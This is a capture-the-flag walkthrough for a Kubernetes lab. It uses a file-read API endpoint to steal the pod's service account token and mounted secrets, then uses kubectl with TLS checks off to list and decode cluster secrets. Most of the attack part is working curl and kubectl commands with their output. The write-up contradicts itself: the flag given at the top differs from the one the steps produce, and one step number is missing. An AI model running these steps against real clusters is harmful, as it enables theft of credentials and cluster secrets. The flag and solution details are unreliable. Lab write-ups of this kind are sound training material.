#  Secret Pirate 

## Challenge Objective
Note: The URLs used in this solution are local and intended for use with Docker Desktop && port forwarding 


Find two parts of a flag and combine them:

- **Part 1**: `ghctf{k8s_path_traversal`
- **Part 2**: `_to_cluster_pwn}`
- **Complete Flag**: `ghctf{k8s_path_traversal_to_cluster_pwn}`

## Solution Steps

### Step 1: Access the Web Application

Navigate to `http://<cluster-ip>:30080` and explore the interface.

### Step 2: Discover Kubernetes Information

First, get the current namespace name:

**Request:**

```bash
curl -X POST http://localhost:8080/api/file \
  -H "Content-Type: application/json" \
  -d '{"path": "/var/run/secrets/kubernetes.io/serviceaccount/namespace"}'
```

**Response:**

```json
{
  "status": "success",
  "path": "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
  "content": "ctf-challenge"
}
```

Now get the service account token:

**Request:**

```bash
curl -X POST http://localhost:8080/api/file \
  -H "Content-Type: application/json" \
  -d '{"path": "/var/run/secrets/kubernetes.io/serviceaccount/token"}'
```

**Response:**

```json
{
  "status": "success",
  "path": "/var/run/secrets/kubernetes.io/serviceaccount/token",
  "content": "eyJhbGciOiJSUzI1NiIs..."
}
```

Save this token as `$KUBE_TOKEN` and note the namespace is `ctf-challenge`.

### Step 3: Reconnaissance - Discover Mounted Secrets

Before knowing what secrets exist, explore the filesystem to find mounted volumes:

**Option A: Check /proc/mounts to see mounted volumes**

```bash
curl -X POST http://localhost:8080/api/file \
  -H "Content-Type: application/json" \
  -d '{"path": "/proc/mounts"}'
```

**Option B: Use the System Info endpoint**

```bash
curl http://localhost:8080/api/system
```

**Option C: Explore common secret mount paths**

```bash
# Try to list directories under /etc/secrets/
curl -X POST http://localhost:8080/api/file \
  -H "Content-Type: application/json" \
  -d '{"path": "/etc/secrets"}'

# Or try common Kubernetes secret mount locations
curl -X POST http://localhost:8080/api/file \
  -H "Content-Type: application/json" \
  -d '{"path": "/etc"}'
```

**Expected discovery:** You'll find directories like `/etc/secrets/db/` and `/etc/secrets/api/`

### Step 4: Explore Secret Contents

Once you discover the `/etc/secrets/db/` directory, list its contents:

**List files in the db secrets directory:**

```bash
# Try to read the directory (this might fail, but try different approaches)
curl -X POST http://localhost:8080/api/file \
  -H "Content-Type: application/json" \
  -d '{"path": "/etc/secrets/db/"}'

```

in this dir you will find password

**🎯 Part 1 Found in password file:** `CTF{DB_PASSWORD`

### Step 5: Use Kubernetes API for Further Discovery

Set up kubectl with the stolen token and discovered namespace:

```bash
export KUBE_TOKEN="eyJhbGciOiJSUzI1NiIs..."
# export KUBE_SERVER="https://127.0.0.1:53612"
export KUBE_SERVER="https://kubernetes.default.svc"

export NAMESPACE="ctf-challenge"
```

**First, check what permissions you have:**

```bash
kubectl --token=$KUBE_TOKEN --server=$KUBE_SERVER --insecure-skip-tls-verify \
  auth can-i --list -n $NAMESPACE
```

**Discover all secrets in the namespace:**

```bash
kubectl --token=$KUBE_TOKEN --server=$KUBE_SERVER --insecure-skip-tls-verify \
  get secrets -n $NAMESPACE
```

**Output:**

```
NAME                 TYPE     DATA   AGE
admin-kubeconfig     Opaque   1      10m
api-keys            Opaque   2      10m
database-credentials Opaque   3      10m
```

**Now you know the secret names! Get the admin-kubeconfig:**

```bash
kubectl --token=$KUBE_TOKEN --server=$KUBE_SERVER --insecure-skip-tls-verify \
  get secret admin-kubeconfig -n $NAMESPACE -o yaml
```

**Output:**

```yaml
apiVersion: v1
data:
  kubeconfig: X2FkbWluLWt1YmVjb25maWd9
kind: Secret
metadata:
  name: admin-kubeconfig
  namespace: ctf-challenge
```

Decode the base64 kubeconfig:

```bash
echo "X2FkbWluLWt1YmVjb25maWd9" | base64 -d
```

**Output:** `_admin-kubeconfig}`

**🎯 Part 2 Found:** `_admin-kubeconfig}`

### Step 7: Combine the Flag Parts

- Part 1: `CTF{DB_PASSWORD`
- Part 2: `_admin-kubeconfig}`
- **Final Flag**: `CTF{DB_PASSWORD_admin-kubeconfig}`

